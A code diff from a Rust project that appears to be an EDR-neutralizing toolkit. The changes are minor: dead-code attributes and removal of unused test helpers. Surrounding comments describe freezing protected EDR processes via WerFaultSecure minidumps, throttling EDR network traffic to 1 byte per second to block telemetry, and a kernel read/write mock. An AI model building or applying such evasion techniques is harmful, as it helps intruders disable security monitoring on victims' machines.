@@ -470,11 +470,14 @@ impl EdrNeutralizeKit for EdrNeutralizer {
 
 /// MINIDUMP_TYPE: MiniDumpWithFullMemory — dump the entire process address
 /// space. This is the most reliable way to trigger WER coma on PPL targets.
+#[allow(dead_code)] // used by freeze_edr_coma (#[cfg(target_os = "windows")])
 const MINIDUMP_WITH_FULL_MEMORY: u32 = 0x00000002;
 
 /// PROCESS_QUERY_LIMITED_INFORMATION = 0x0400
+#[allow(dead_code)] // used by freeze_edr_coma (#[cfg(target_os = "windows")])
 const PROCESS_QUERY_LIMITED: u32 = 0x0400;
 /// PROCESS_VM_READ = 0x0010
+#[allow(dead_code)] // used by freeze_edr_coma (#[cfg(target_os = "windows")])
 const PROCESS_VM_READ_FLAG: u32 = 0x0010;
 
 /// Trigger WerFaultSecure coma on a PPL process by initiating a full memory
@@ -665,6 +668,7 @@ fn freeze_edr_coma(_pid: u32) -> Result<(), KitError> {
 /// QoS bandwidth limit: 8 bit/s = 1 byte/s. At this rate, the EDR's TLS
 /// handshake (typically 2-5 KB) would take 2000-5000 seconds — effectively
 /// blocking all telemetry.
+#[allow(dead_code)] // used by choke_edr_qos (#[cfg(target_os = "windows")])
 const CHOKE_BANDWIDTH_BPS: u32 = 1;
 
 /// Throttle an EDR process's network bandwidth to 8 bit/s via the Windows
@@ -856,14 +860,6 @@ mod tests {
                 m.insert(addr + i, *b);
             }
         }
-        fn get_u64(&self, addr: usize) -> u64 {
-            let m = self.0.lock();
-            let mut bytes = [0u8; 8];
-            for (i, b) in bytes.iter_mut().enumerate() {
-                *b = *m.get(&(addr + i)).unwrap_or(&0);
-            }
-            u64::from_le_bytes(bytes)
-        }
     }
     impl KernelRw for MockKrw {
         fn kread(&self, kaddr: usize, dst: &mut [u8]) -> Result<(), KrwError> {
@@ -935,7 +931,6 @@ mod tests {
 
     #[test]
     fn edr_neutralize_trait_kill_redirects_to_kill_method() {
-        let krw = MockKrw::new();
         let offsets = test_offsets();
         let kit = EdrNeutralizer {
             ps_active_process_head_kva: 0x1000,
